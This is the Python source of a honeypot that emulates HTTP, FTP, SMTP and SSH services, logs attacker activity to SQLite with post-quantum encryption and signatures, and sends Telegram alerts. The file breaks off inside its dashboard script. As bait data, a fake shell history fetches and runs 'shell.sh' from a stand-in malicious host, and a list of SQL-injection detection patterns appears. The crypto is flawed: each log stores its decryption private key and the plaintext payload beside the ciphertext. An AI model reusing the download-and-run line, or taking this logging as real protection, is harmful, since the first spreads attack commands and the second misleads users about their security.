import socket
import threading
import sqlite3
import paramiko
import logging
import oqs
import os
import json
import copy
import requests
import time
import base64
import select
import telebot
import re
import random
import pyfiglet
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs, unquote_plus
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

# Print Banner at Startup
banner = pyfiglet.figlet_format("QryptX", font="dos_rebel")  # or use any other font
print(banner)


# Initialize Logging (No Timestamps)
logging.basicConfig(level=logging.INFO, format="%(message)s")

# SQLite Database Setup
conn = sqlite3.connect("honeypot.db", check_same_thread=False)
cursor = conn.cursor()
cursor.execute("""
    CREATE TABLE IF NOT EXISTS attacks (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        timestamp TEXT,
        ip TEXT,
        service TEXT,
        payload TEXT,
        exploit TEXT,
        encrypted_log TEXT,
        tag TEXT,
        nonce TEXT,
        ciphertext_pqc TEXT,
        public_key TEXT,
        private_key TEXT,
        signature TEXT
    )
""")
conn.commit()

# Generate Dilithium keys for signing - this should be done once and keys saved
try:
    with open("dilithium_private_key.bin", "rb") as f:
        dilithium_private_key = f.read()
    with open("dilithium_public_key.bin", "rb") as f:
        dilithium_public_key = f.read()
except FileNotFoundError:
    dilithium = oqs.Signature("Dilithium5")
    dilithium_public_key = dilithium.generate_keypair()
    dilithium_private_key = dilithium.export_secret_key()
    with open("dilithium_private_key.bin", "wb") as f:
        f.write(dilithium_private_key)
    with open("dilithium_public_key.bin", "wb") as f:
        f.write(dilithium_public_key)

def pqc_encrypt(data):
    """Encrypt data using Kyber1024 for key encapsulation and AES-GCM for data encryption"""
    kem = oqs.KeyEncapsulation("Kyber1024")
    public_key = kem.generate_keypair()  # Generates and stores private key internally
    
    # Save the private key
    private_key = kem.export_secret_key()
    
    # Generate shared secret and ciphertext
    ciphertext_pqc, shared_secret = kem.encap_secret(public_key)
    
    # Use shared_secret as AES key (trimmed to 32 bytes for AES-256)
    aes_key = shared_secret[:32]
    
    # AES Encryption
    plaintext = data
    cipher = AES.new(aes_key, AES.MODE_GCM)
    ciphertext_aes, tag = cipher.encrypt_and_digest(plaintext.encode())
    
    # Prepare encrypted data
    encrypted_log = base64.b64encode(ciphertext_aes).decode()
    
    # Encode all encryption parameters
    tag_b64 = base64.b64encode(tag).decode()
    nonce_b64 = base64.b64encode(cipher.nonce).decode()
    ciphertext_pqc_b64 = base64.b64encode(ciphertext_pqc).decode()
    public_key_b64 = base64.b64encode(public_key).decode()
    private_key_b64 = base64.b64encode(private_key).decode()
    
    # Return all encryption parameters to be stored in database
    return {
        "ciphertext": encrypted_log,
        "tag": tag_b64,
        "nonce": nonce_b64,
        "ciphertext_pqc": ciphertext_pqc_b64,
        "public_key": public_key_b64,
        "private_key": private_key_b64
    }
def pqc_sign(data):
    """Digitally sign data using Dilithium"""
    with open("dilithium_private_key.bin", "rb") as f:
        dilithium_private_key = f.read()
        dilithium = oqs.Signature("Dilithium5", secret_key=dilithium_private_key)
    signature = dilithium.sign(data.encode())
    return base64.b64encode(signature).decode()

# **TELEGRAM BOT CONFIGURATION**
BOT_TOKEN = "Telegram bot token"
CHAT_ID = "Telegram chat id"
bot = telebot.TeleBot(BOT_TOKEN)

# Secure Attack Logging (Thread-Safe) + Telegram Alert
def log_attack(ip, service, data, exploit="None"):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    event_id = time.time()  # Unique event ID
    logging.debug(f"[DEBUG] Logging attack: {ip}, {service}, {data}, {exploit}")
    
    log_entry = f"[{service}] {ip} - {exploit} - {data} (Event ID: {event_id})"
    logging.info(log_entry)
    print(log_entry)
    
    if isinstance(data, dict):
        data = json.dumps(data)
    
    # Encrypt attack data
    plaintext = f"{timestamp} - {ip} - {service} - {data} - {exploit}"
    encryption_data = pqc_encrypt(plaintext)
    
    # Digitally sign the encrypted log
    signature = pqc_sign(encryption_data["ciphertext"])
    
    try:
        conn = sqlite3.connect("honeypot.db")
        cursor = conn.cursor()
        cursor.execute("""
            INSERT INTO attacks (
                timestamp, ip, service, payload, exploit, 
                encrypted_log, tag, nonce, ciphertext_pqc, 
                public_key, private_key, signature
            )
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            timestamp, ip, service, data, exploit,
            encryption_data["ciphertext"], 
            encryption_data["tag"],
            encryption_data["nonce"],
            encryption_data["ciphertext_pqc"],
            encryption_data["public_key"],
            encryption_data["private_key"],
            signature
        ))
        conn.commit()
        conn.close()
        
        # Send Telegram Alert
        telegram_message = (
            f"🚨 *Honeypot Alert* 🚨\n"
            f"🔹 *Time:* {timestamp}\n"
            f"🌍 *Attacker IP:* {ip}\n"
            f"🛠 *Service:* {service}\n"
            f"💥 *Exploit:* {exploit}\n"
            f"📜 *Payload:*\n```{data}```"
        )
        bot.send_message(CHAT_ID, telegram_message, parse_mode="Markdown")
    except Exception as e:
        logging.error(f"[DB ERROR] Failed to log attack: {e}")

# Fetch latest attacks
def fetch_recent_attacks(limit=5):
    conn = sqlite3.connect("honeypot.db")
    cursor = conn.cursor()

    cursor.execute("SELECT timestamp, ip, service, exploit, payload FROM attacks ORDER BY timestamp DESC LIMIT ?", (limit,))
    attacks = cursor.fetchall()
    
    conn.close()
    
    return attacks

# **Telegram Command: /stats**
@bot.message_handler(commands=['stats'])
def send_stats(message):
    total_attacks, unique_ips, top_service, latest_attack = fetch_attack_stats()
    
    response = (
        f"📊 *Honeypot Stats*:\n"
        f"🔹 *Total Attacks:* {total_attacks}\n"
        f"🔹 *Unique Attackers:* {unique_ips}\n"
        f"🔹 *Top Targeted Service:* {top_service}\n"
        f"🔹 *Latest Attack:* {latest_attack}"
    )
    
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# **Telegram Command: /attacks**
@bot.message_handler(commands=['attacks'])
def send_recent_attacks(message):
    attacks = fetch_recent_attacks()

    if not attacks:
        bot.send_message(message.chat.id, "No attack logs available.")
        return
    
    response = "📡 *Recent Attacks:*\n"
    for attack in attacks:
        timestamp, ip, service, exploit, payload = attack
        formatted_time = timestamp

        response += (
            f"\n🕒 *Time:* {formatted_time}\n"
            f"🌍 *IP:* {ip}\n"
            f"🛠 *Service:* {service}\n"
            f"💥 *Exploit:* {exploit}\n"
            f"📜 *Payload:*\n```{payload}```\n"
            f"———————————"
        )
    
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# Start the Telegram Bot in a separate thread
def start_telegram_bot():
    print("Starting Telegram Bot...")
    bot.polling()

# Start Telegram bot in background
threading.Thread(target=start_telegram_bot, daemon=True).start()




# Fake Website Templates
LOGIN_PAGE_TEMPLATE = """HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head>
    <title>Secure Login</title>
    <style>
        body {{ font-family: Arial, sans-serif; text-align: center; padding: 50px; }}
        form {{ display: inline-block; text-align: left; padding: 20px; border: 1px solid #ddd; }}
        input {{ margin: 5px; padding: 5px; }}
        button {{ padding: 8px; background: blue; color: white; border: none; }}
        .error {{ color: red; }}
    </style>
</head>
<body>
    <h2>Secure Corporate Login</h2>
    <p>Enter your credentials:</p>
    <form action="/login" method="POST">
        <label>Username:</label> <input type="text" name="username"><br>
        <label>Password:</label> <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    <br>{error_message}<br>
</body>
</html>
"""

ADMIN_PANEL = """HTTP/1.1 200 OK
Content-Type: text/html

<html>
<head>
    <title>Company Admin Panel</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        table { width: 100%; border-collapse: collapse; }
        th, td { border: 1px solid black; padding: 8px; text-align: left; }
        th { background-color: #ddd; }
    </style>
</head>
<body>
    <h1>Welcome to Company Admin Portal</h1>
    <h2>Company Employee Directory</h2>
    <table border="1" style="width:100%; text-align:left;">
        <tr>
            <th>Name</th>
            <th>Department</th>
            <th>Email</th>
            <th>Phone</th>
        </tr>
        <tr>
            <td>John Doe</td>
            <td>IT Security</td>
            <td>jdoe@company.com</td>
            <td>(555) 123-4567</td>
        </tr>
        <tr>
            <td>Jane Smith</td>
            <td>Finance</td>
            <td>jsmith@company.com</td>
            <td>(555) 234-5678</td>
        </tr>
        <tr>
            <td>Mike Johnson</td>
            <td>HR</td>
            <td>mjohnson@company.com</td>
            <td>(555) 345-6789</td>
        </tr>
        <tr>
            <td>Emily White</td>
            <td>Marketing</td>
            <td>ewhite@company.com</td>
            <td>(555) 456-7890</td>
        </tr>
    </table>
</body>
</html>
"""

ACCESS_DENIED = """HTTP/1.1 403 Forbidden
Content-Type: text/html

<html>
<head><title>Access Denied</title></head>
<body>
    <h1>403 Forbidden</h1>
    <p>Invalid credentials detected.</p>
</body>
</html>
"""

# Valid Fake Credentials
VALID_USERNAME = "user"
VALID_PASSWORD = "password"

# SQL Injection Patterns
SQLI_PATTERNS = [
    r"\bOR\b", r"\bAND\b", r"\bUNION\b", "--", r"' OR '1'='1", r"' OR 1=1 --",
    r"DROP TABLE", r"SELECT \* FROM", r"' OR 'x'='x"
]

# Handle HTTP Requests
def handle_http(client_socket, client_address):
    ip = client_address[0]
    
    try:
        request = client_socket.recv(4096).decode("utf-8", errors="ignore")  # Increase buffer size
        if not request:
            return

        if "GET /" in request:
            response = LOGIN_PAGE_TEMPLATE.format(error_message="")  # Show login page

        elif "POST /login" in request:
            try:
                # Extract POST data
                post_data = request.split("\r\n\r\n", 1)[1].strip()
                logging.info(f"[DEBUG] Raw POST Data from {ip}: {post_data}")

                # Ensure POST data is not empty
                if not post_data:
                    raise ValueError("POST data is empty")

                post_params = {}
                for param in post_data.split("&"):
                    if "=" in param:
                        key, value = param.split("=", 1)
                        post_params[key] = unquote_plus(value)
                
                username = post_params.get("username", "").strip()
                password = post_params.get("password", "").strip()

                # Debugging Logs
                logging.info(f"[DEBUG] Login attempt from {ip}: {username} | {password}")
                print(f"[DEBUG] Login attempt from {ip}: {username} | {password}")

                # Check for SQL Injection
                for pattern in SQLI_PATTERNS:
                    if re.search(pattern, username, re.IGNORECASE) or re.search(pattern, password, re.IGNORECASE):
                        log_attack(ip, "HTTP", f"SQL Injection Attempt: {username}:{password}", "SQLi")
                        response = ACCESS_DENIED  # 🚫 Block access instead of granting it
                        break
                else:  # Only runs if no SQLi detected
                    # Check if credentials are correct
                    if username == VALID_USERNAME and password == VALID_PASSWORD:
                        log_attack(ip, "HTTP", f"Successful Fake Login: {username}:{password}", "Credential Theft")
                        response = ADMIN_PANEL  # Fake admin panel access
                    else:
                        print(f"[DEBUG] Calling log_attack() for {ip}")
                        log_attack(ip, "HTTP", f"Failed Login Attempt: {username}:{password}", "Brute Force")
                        print(f"[DEBUG] log_attack() executed for {ip}")

                        response = LOGIN_PAGE_TEMPLATE.format(error_message="incorrect")  # Stay on login page

            except Exception as e:
                response = ACCESS_DENIED
                logging.error(f"[HTTP ERROR] Login parsing failed: {e}")

        else:
            response = "HTTP/1.1 404 Not Found\n\n<h1>404 Page Not Found</h1>"

        client_socket.send(response.encode())
        client_socket.close()

    except Exception as e:
        logging.error(f"[HTTP ERROR] Unexpected error: {e}")


# Fake FTP Server
VALID_FTP_USERS = {
    "user": "passs"
}

# Fake File System
FAKE_FILES = ["file1.txt", "report.pdf", "secret.doc"]

def handle_ftp(client_socket, client_address):
    ip = client_address[0]
    client_socket.send(b"220 Welcome to FTP Server.\n")

    while True:
        data = client_socket.recv(1024).decode().strip()
        if not data:
            break

        if "USER" in data:
            username = data.split(" ")[1]
            client_socket.send(b"331 Password required.\n")

            password_data = client_socket.recv(1024).decode().strip()
            if "PASS" in password_data:
                password = password_data.split(" ")[1]

                if username in VALID_FTP_USERS and VALID_FTP_USERS[username] == password:
                    client_socket.send(b"230 Login successful.\n")
                    log_attack(ip, "FTP", f"Successful Login: {username}:{password}", "Credential Theft")
                else:
                    client_socket.send(b"530 Login incorrect.\n")
                    log_attack(ip, "FTP", f"Failed Login Attempt: {username}:{password}", "Brute Force")

        elif "LIST" in data or "ls" in data:
            file_list = "\n".join(FAKE_FILES) + "\n"
            client_socket.send(f"150 Here comes the file list.\n{file_list}226 Directory send OK.\n".encode())
            log_attack(ip, "FTP", "Listed files", "Reconnaissance")

        elif "RETR" in data or "get" in data:
            file_name = data.split(" ")[1] if " " in data else "unknown"
            client_socket.send(b"150 Opening data connection.\n226 Transfer complete.\n")
            log_attack(ip, "FTP", f"Tried downloading {file_name}", "File Theft")

        elif "STOR" in data or "put" in data:
            file_name = data.split(" ")[1] if " " in data else "unknown"
            client_socket.send(b"150 Ok to send data.\n226 Transfer complete.\n")
            log_attack(ip, "FTP", f"Uploaded {file_name}", "Malware Upload")    

        elif "QUIT" in data:
            client_socket.send(b"221 Goodbye.\n")
            break

        else:
            client_socket.send(b"500 Unknown command.\n")

    client_socket.close()
    

# Fake SMTP Server
def handle_smtp(client_socket, client_address):
    ip = client_address[0]
    client_socket.send(b"220 mail.honeypot.com ESMTP Postfix\n")  # Fake SMTP banner

    sender = recipient = None
    email_content = []

    while True:
        try:
            data = client_socket.recv(1024).decode(errors="ignore").strip()
            if not data:
                break

            # SMTP handshake
            if "EHLO" in data or "HELO" in data:
                client_socket.send(b"250-mail.honeypot.com Hello\n250-SIZE 52428800\n250 AUTH LOGIN PLAIN\n")

            # Brute force login loop
            elif "AUTH LOGIN" in data:
                while True:
                    client_socket.send(b"334 VXNlcm5hbWU6\n")  # "Username:" in Base64
                    username_b64 = client_socket.recv(1024).decode(errors="ignore").strip()
                    try:
                        username = base64.b64decode(username_b64).decode(errors="ignore")
                    except Exception:
                        username = "[INVALID BASE64]"

                    client_socket.send(b"334 UGFzc3dvcmQ6\n")  # "Password:" in Base64
                    password_b64 = client_socket.recv(1024).decode(errors="ignore").strip()
                    try:
                        password = base64.b64decode(password_b64).decode(errors="ignore")
                    except Exception:
                        password = "[INVALID BASE64]"

                    log_attack(ip, "SMTP", f"Brute Force Attempt: {username}:{password}", "Credential Harvesting")

                    # Simulate successful login for known credentials
                    if username == "test" and password == "password":
                        client_socket.send(b"235 Authentication successful\n")  # Fake success
                        log_attack(ip, "SMTP", f"SMTP AUTH SUCCESS: {username}:{password}", "Honeypot Login")
                        break  # Exit loop if correct login

                    else:
                        client_socket.send(b"535 Authentication failed\n")  # Fail and retry

            # Capture MAIL FROM
            elif data.startswith("MAIL FROM:"):
                sender = data.split(":", 1)[1].strip()
                client_socket.send(b"250 OK\n")

            # Capture RCPT TO
            elif data.startswith("RCPT TO:"):
                recipient = data.split(":", 1)[1].strip()
                client_socket.send(b"250 OK\n")

            # Capture Email Content
            elif data.startswith("DATA"):
                client_socket.send(b"354 Start mail input; end with <CRLF>.<CRLF>\n")

                while True:
                    line = client_socket.recv(1024).decode(errors="ignore")
                    if line.strip() == ".":
                        break
                    if line:
                        email_content.append(line)



                full_email = "\n".join(email_content)

                # Debug print to ensure the email content is captured
                print("Captured email content:\n", full_email)

                # Log the attack with the full email content
                log_attack(ip, "SMTP", f"Email from {sender} to {recipient}\n{full_email}", "Fake Email Sent")

                client_socket.send(b"250 OK: Message accepted\n")

            # VRFY (Verify User)
            elif data.startswith("VRFY"):
                client_socket.send(b"252 Cannot VRFY user but will accept message\n")

            # QUIT (End Connection)
            elif data.startswith("QUIT"):
                client_socket.send(b"221 Bye\n")
                break  # Exit the loop to end the connection

            # Unknown Commands
            else:
                client_socket.send(b"500 Command not recognized\n")

        except Exception as e:  
            logging.error(f"[SMTP ERROR] {e}")
            break

    client_socket.close()


class FakeFileSystem:
    def __init__(self):
        self.base_filesystem = {
            "/": {
                "home": {
                    "user": {
                        "Documents": {"important.txt":  "[67, 117, 209, 98, 2, 209, 98, 2, 125, 173, 209, 118, 54, 12, 186, 2, 136, 186, 115, 2, 125, 54, 103, 186, 2, 117, 12, 12, 125, 28, 47, 47, 121, 109, 33, 37, 121, 175, 218, 37, 33, 66, 37, 121, 29, 121, 47, 218, 29, 108, 104, 98, 186, 173, 145, 54, 96, 186, 2, 28, 2, 85, 209, 49, 54, 145, 108, 125, 54, 98, 98, 136, 76, 173, 172, 2, 28, 2, 96, 186, 117, 85, 209, 75]"},
                        "Downloads": {"notes.txt": "important"},
                        "Desktop": {"README.txt": self._generate_timestamp()},
                        ".ssh": {
                            "id_rsa": self._generate_timestamp(),
                            "known_hosts": self._generate_timestamp(),
                        },
                        ".bash_history": self._generate_fake_bash_history(),
                    }
                },
                "var": {
                    "log": {
                        "auth.log": self._generate_timestamp(),
                        "syslog": self._generate_timestamp(),
                    }
                },
                "etc": {
                    "passwd": "root:x:0:0:root:/root:/bin/bash\nuser:x:1000:1000:user:/home/user:/bin/bash",
                    "shadow": "root:!:18642:0:99999:7:::",
                },
                "tmp": {},
                "proc": {
                    "cpuinfo": self._generate_fake_cpuinfo()
                }
            }
        }
        self.sessions = {}

    def get_current_session(self, session_id):
        if session_id not in self.sessions:
            self.sessions[session_id] = {
                "fs": copy.deepcopy(self.base_filesystem),
                "cwd": "/home/user"  # Start in home directory
            }   
        return self.sessions[session_id]

    def _resolve_path(self, session_fs, path):
        """Resolve path within the fake filesystem."""
        if path == "/":
            return session_fs["/"]  # Root directory
        
        parts = path.strip("/").split("/")
        node = session_fs["/"]  # Start at root

        for part in parts:
            if part in node and isinstance(node[part], dict):  # Ensure it's a directory
                node = node[part]
            else:
                return None  # Path doesn't exist
        return node


    def _generate_timestamp(self):
        """Generate fake timestamps for ls -la output."""
        timestamp = datetime.now() - timedelta(days=random.randint(0, 30))
        return f"-rw-r--r-- 1 user user 4096 {timestamp.strftime('%b %d %H:%M')}"

    def _generate_fake_bash_history(self):
        """Create a fake .bash_history."""
        return [
            "ls -la",
            "cd /etc",
            "cat passwd",
            "cat shadow",
            "cd ~",
            "ls -la",
            "wget http://malicious.com/shell.sh",
            "chmod +x shell.sh",
            "./shell.sh",
            "exit"
        ]
    def _generate_fake_cpuinfo(self):
        """Fake CPU info similar to real /proc/cpuinfo."""
        return """processor   : 0
vendor_id   : GenuineIntel
cpu family  : 6
model       : 158
model name  : Intel(R) Core(TM) i7-9750H CPU @ 2.60GHz
stepping    : 10
cpu MHz     : 2592.000
cache size  : 12288 KB
flags       : fpu vme de pse tsc msr pae mce cx8 sep mtrr"""
 
    def pwd(self, session_id):
        """Return the current working directory."""
        session = self.get_current_session(session_id)
        return session["cwd"]

    def echo(self, session_id, text):
        """Simulate echo command."""
        return text

    def cat(self, session_id, filename):
        """Read a file."""
        session = self.get_current_session(session_id)
        session_fs = session["fs"]

        if filename == "/proc/cpuinfo":
            return session_fs["/"]["proc"]["cpuinfo"]

        node = self._resolve_path(session_fs, session["cwd"])
        if filename in node and isinstance(node[filename], str):
            return node[filename]
        return "File not found"

    
# Fake SSH Server Handler
class FakeSSHServer(paramiko.ServerInterface):
    def __init__(self, client_ip):
        self.client_ip = client_ip
        self.event = threading.Event()

    def check_auth_password(self, username, password):
        log_attack(self.client_ip, "SSH", f"Login Attempt: {username}:{password}", "Brute Force")
        if username == "user" and password == "password123":
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

    def check_auth_publickey(self, username, key):
        return paramiko.AUTH_FAILED

    def check_channel_request(self, kind, chanid):
        return paramiko.OPEN_SUCCEEDED if kind == "session" else paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def get_allowed_auths(self, username):
        return "password"

    def check_channel_shell_request(self, channel):
        self.event.set()
        return True


# Handle SSH Client Session
def handle_ssh(client, addr):
    client_ip = addr[0]
    transport = paramiko.Transport(client)
    transport.add_server_key(paramiko.RSAKey.generate(2048))
    server = FakeSSHServer(client_ip)

    fs = FakeFileSystem()
    session_id = client_ip  # Use IP as session identifier

    try:
        transport.start_server(server=server)
        channel = transport.accept(20)
        if channel is None:
            return

        server.event.wait(10)
        if not server.event.is_set():
            return

        channel.send("Welcome to Ubuntu 20.04 LTS\n")
        channel.send("user@server:~$ ")

        while True:
            command = channel.recv(1024).decode().strip()
            if not command:
                break

            log_attack(client_ip, "fake linux server", command, "Command Execution")

            response = ""  # ✅ Ensure response is always initialized

            if command == "pwd":
                response = fs.pwd(session_id)
            elif command.startswith("echo "):
                response = fs.echo(session_id, command[5:])
                
            elif command.startswith("cat "):
                filename = command.split(" ", 1)[1]
                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])

                if filename in node:
                    if isinstance(node[filename], str):  # ✅ Ensure it's a string
                        response = node[filename] or "\n"  # ✅ Avoid empty output
                    else:
                        response = f"-bash: cat: {filename}: Is a directory"
                else:
                    response = f"-bash: cat: {filename}: No such file or directory"
                    
            elif command.startswith("nano "):
                filename = command.split(" ", 1)[1]
                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])

                # Load existing content or create an empty file
                file_content = node.get(filename, "")

                # Display nano editor with existing content
                channel.send(f"\nGNU nano 5.4   {filename}  \n\n")
                channel.send(file_content + "\n")
                channel.send("[ Press CTRL+X to save and exit ]\n")

                new_content = file_content.split("\n")  # Start with existing content
                edit_mode = True  # Flag to track editing

                while edit_mode:
                    line = channel.recv(1024).decode(errors="ignore")

                    if "\x18" in line:  # Detect CTRL+X to exit nano
                        edit_mode = False
                    else:
                        new_content.append(line.strip())  # Allow editing

                # Save the modified content
                node[filename] = "\n".join(new_content)

                channel.send(f"\n[ {filename} saved successfully! ]\n")
                channel.send(f"user@server:{session['cwd']}$ ")  # Return to shell prompt



            elif command == "ls":
                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])

                if isinstance(node, dict):
                    response = "  ".join(node.keys())
                else:
                    response = "Not a directory"
                    
            elif command.startswith("rm "):
                filename = command.split(" ", 1)[1]
                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])

                if filename in node:
                    del node[filename]
                    response = ""
                else:
                    response = f"rm: cannot remove '{filename}': No such file or directory"
                    
            elif ">" in command:
                parts = command.split(">")
                echo_part = parts[0].strip()
                filename = parts[1].strip()

                append_mode = ">>" in command  # Check if it's append mode

                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])

                # Extract the text part from the echo command
                if echo_part.startswith("echo "):
                    content = echo_part[5:].strip().strip('"').strip("'")  # Remove quotes

                    if filename in node:
                        if append_mode:
                            node[filename] += "\n" + content  # Append content
                        else:
                            node[filename] = content  # Overwrite content
                    else:
                        node[filename] = content  # Create and write

                    response = ""
                    
                    
            elif command.startswith("touch "):
                filename = command.split(" ", 1)[1]
                session = fs.get_current_session(session_id)
                node = fs._resolve_path(session["fs"], session["cwd"])
                node[filename] = ""  # Create an empty file
                response = ""

            elif command.startswith("cd "):
                new_path = command.split(" ", 1)[1]
                session = fs.get_current_session(session_id)

                if new_path == "..":
                    if session["cwd"] != "/":
                        session["cwd"] = "/".join(session["cwd"].rstrip("/").split("/")[:-1]) or "/"
                elif new_path.startswith("/"):
                    resolved = fs._resolve_path(session["fs"], new_path)
                    if resolved is not None and isinstance(resolved, dict):
                        session["cwd"] = new_path.rstrip("/")
                    else:
                        response = f"-bash: cd: {new_path}: No such file or directory"
                else:
                    new_abs_path = session["cwd"].rstrip("/") + "/" + new_path
                    resolved = fs._resolve_path(session["fs"], new_abs_path)
                    if resolved is not None and isinstance(resolved, dict):
                        session["cwd"] = new_abs_path.rstrip("/")
                    else:
                        response = f"-bash: cd: {new_path}: No such file or directory"

                response = ""  # No output for successful `cd`

            elif command.startswith("sudo") or command.startswith("su"):
                channel.send("[sudo] password for user: ")
                fake_password = channel.recv(1024).decode().strip()
                log_attack(client_ip, "root_attempt", fake_password, "Privilege Escalation")
                response = "user is not in the sudoers file. This incident will be reported."

            else:
                response = "-bash: command not found"

            # ✅ Send correct prompt showing the current directory
            session = fs.get_current_session(session_id)
            channel.send(response + f"\nuser@server:{session['cwd']}$ ")


    except Exception as e:
        logging.error(f"SSH ERROR: {e}")
    finally:
        transport.close()
        client.close()
        
        


        

# Dashboard HTML template
DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Honeypot Dashboard</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f5f5f5;
            color: #333;
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .header {
            background-color: #2c3e50;
            color: white;
            padding: 20px;
            text-align: center;
            border-radius: 5px 5px 0 0;
            position: relative;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px; /* Changed from right to left */
            width: 100px;
            height: auto;
        }
        .dashboard {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            margin-top: 20px;
        }
        .card {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 20px;
            flex: 1;
            min-width: 300px;
        }
        .card h3 {
            margin-top: 0;
            border-bottom: 1px solid #eee;
            padding-bottom: 10px;
            color: #2c3e50;
        }
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        .stat-card {
            background-color: white;
            border-radius: 5px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
            padding: 15px;
            flex: 1;
            text-align: center;
        }
        .stat-value {
            font-size: 24px;
            font-weight: bold;
            color: #2c3e50;
            margin: 10px 0;
        }
        .stat-label {
            color: #7f8c8d;
            font-size: 14px;
        }
        .stat-card.attacks { border-top: 3px solid #e74c3c; }
        .stat-card.ips { border-top: 3px solid #3498db; }
        .stat-card.services { border-top: 3px solid #2ecc71; }
        .stat-card.latest { border-top: 3px solid #f39c12; }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 12px 15px;
            border-bottom: 1px solid #ddd;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
            font-weight: bold;
        }
        tr:hover {
            background-color: #f5f5f5;
        }
        .pagination {
            display: flex;
            justify-content: center;
            margin-top: 20px;
        }
        .pagination button {
            margin: 0 5px;
            padding: 8px 15px;
            background-color: #3498db;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .pagination button:hover {
            background-color: #2980b9;
        }
        .alert {
            color: white;
            padding: 10px;
            margin-top: 10px;
            border-radius: 3px;
            display: none;
        }
        .alert-success {
            background-color: #2ecc71;
        }
        .alert-error {
            background-color: #e74c3c;
        }
        .refresh-btn {
            margin-left: auto;
            background-color: #2ecc71;
            padding: 8px 15px;
            color: white;
            border: none;
            border-radius: 3px;
            cursor: pointer;
        }
        .refresh-btn:hover {
            background-color: #27ae60;
        }
        .actions-bar {
            display: flex;
            margin-bottom: 10px;
            align-items: center;
        }
        #attackTable {
            overflow-x: auto;
        }
        footer {
            text-align: center;
            margin-top: 20px;
            padding: 10px;
            color: #7f8c8d;
            font-size: 14px;
        }
        .creator-name {
            font-weight: bold;
            color: #2c3e50;
        }
        .payload-cell {
            position: relative;
            max-width: 300px;
            word-break: break-all;
        }
        .payload-content {
            display: block;
            width: 100%;
            height: auto;
            overflow-wrap: break-word;
        }
        .payload-toggle {
            cursor: pointer;
            color: #3498db;
            margin-top: 5px;
            font-size: 12px;
            display: none;
        }
        .long-payload .payload-toggle {
            display: inline-block;
        }
        .payload-expanded .payload-toggle:before {
            content: "Show less";
        }
        .payload-collapsed .payload-toggle:before {
            content: "Show more";
        }
        .payload-collapsed .payload-content {
            max-height: 60px;
            overflow: hidden;
        }
        @media (max-width: 768px) {
            .stats {
                flex-direction: column;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Honeypot Security Dashboard</h1>
            <p>Real-time attack monitoring and visualization</p>
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Amrita-vishwa-vidyapeetham-logo.svg/2560px-Amrita-vishwa-vidyapeetham-logo.svg.png" class="logo">
        </div>
        
        <div class="stats">
            <div class="stat-card attacks">
                <div class="stat-value" id="totalAttacks">0</div>
                <div class="stat-label">Total Attacks</div>
            </div>
            <div class="stat-card ips">
                <div class="stat-value" id="uniqueIPs">0</div>
                <div class="stat-label">Unique Attackers</div>
            </div>
            <div class="stat-card services">
                <div class="stat-value" id="topService">-</div>
                <div class="stat-label">Top Target</div>
            </div>
            <div class="stat-card latest">
                <div class="stat-value" id="latestAttack">-</div>
                <div class="stat-label">Latest Attack Time</div>
            </div>
        </div>
        
        <div class="dashboard">
            <div class="card" style="width: 100%;">
                <h3>Recent Attacks</h3>
                <div class="actions-bar">
                    <span id="resultCount">Showing 0 results</span>
                    <button class="refresh-btn" id="refreshBtn">Refresh Data</button>
                </div>
                <div id="attackTable">
                    <table>
                        <thead>
                            <tr>
                                <th>Time</th>
                                <th>IP Address</th>
                                <th>Service</th>
                                <th>Exploit Type</th>
                                <th>Payload</th>
                            </tr>
                        </thead>
                        <tbody id="attacksTableBody">
                            <!-- Attack data will be loaded here -->
                        </tbody>
                    </table>
                </div>
                <div class="pagination">
                    <button id="prevPage">Previous</button>
                    <span id="pageInfo">Page 1</span>
                    <button id="nextPage">Next</button>
                </div>
            </div>
        </div>
        
        <footer>
            <p>© 2025 | Developed by <span class="creator-name">FIYAN MEHFIL AYOOB & MELVINA JOSE</span> | Post-Quantum Cryptography Honeypot</p>
        </footer>
    </div>
    
    <script>
        // Global variables
        let currentPage = 1;
        const itemsPerPage = 10;
        let allAttacks = [];
        let filteredAttacks = [];
        
        // Load attack data from API
        async function loadAttackData() {
            try {
                const response = await fetch('/api/attacks');
                const data = await response.json();
                
                allAttacks = data.attacks;
                filteredAttacks = [...allAttacks];
                
                updateStats(data.stats);
                renderAttackTable();
                
                document.getElementById('resultCount').textContent = `Showing ${filteredAttacks.length} results`;
            } catch (error) {
                console.error('Error loading attack data:', error);
            }
        }
        
        // Update statistics
